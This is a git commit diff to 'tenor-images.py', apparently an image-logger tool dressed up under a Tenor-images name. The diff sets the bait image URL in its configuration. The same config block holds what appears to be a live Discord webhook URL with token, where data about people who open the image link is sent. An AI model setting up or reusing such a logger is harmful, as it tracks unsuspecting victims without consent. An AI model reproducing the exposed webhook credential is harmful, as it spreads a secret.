6135b34160a22fcde5e3ded4e902554cabefa1f6
theskidboi259 <skylabsceoofsky.og@gmail.com>
2025-07-03 15:56:56 -0600

    Update tenor-images.py

--- api/tenor-images.py
+++ api/tenor-images.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1390446023700254944/jv1FY--zqYBExeesQWdvrQWJ6_YAbeMzAcyhzEqhseQY40A8duLsnuPXPKaHrngAXfhm",
-    "image": "", # You can also have a custom image by using a URL argument
+    "image": "https://logo.enzonic.com/", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
